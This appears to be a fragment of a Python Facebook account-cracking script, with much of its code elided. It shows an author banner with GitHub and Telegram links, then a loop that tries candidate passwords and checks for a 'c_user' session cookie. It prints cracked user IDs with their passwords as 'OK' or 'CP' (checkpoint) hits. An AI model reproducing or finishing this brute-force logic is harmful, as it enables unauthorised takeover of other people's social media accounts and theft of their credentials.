...
def banner():
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧. HAMIDUL                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/MDHAMIDUL30 %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/hacksar       %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [HAMIDUL-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [HAMIDUL-CP] '+uidx+' | '+pasw+'\033[0;97m')
